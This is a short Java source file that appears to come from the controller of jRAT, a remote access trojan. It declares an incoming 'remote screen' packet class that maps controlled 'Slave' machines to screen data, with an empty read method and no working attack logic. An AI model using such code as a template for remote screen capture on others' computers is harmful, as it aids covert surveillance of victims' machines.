package pro.jrat.client.packets.incoming;

import java.io.DataInputStream;
import java.util.HashMap;

import pro.jrat.client.RemoteScreenData;
import pro.jrat.client.Slave;

public class Packet17RemoteScreen extends AbstractIncomingPacket {

	public boolean requestAgain = true;
	public static final HashMap<Slave, RemoteScreenData> instances = new HashMap<Slave, RemoteScreenData>();

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		
	}
}
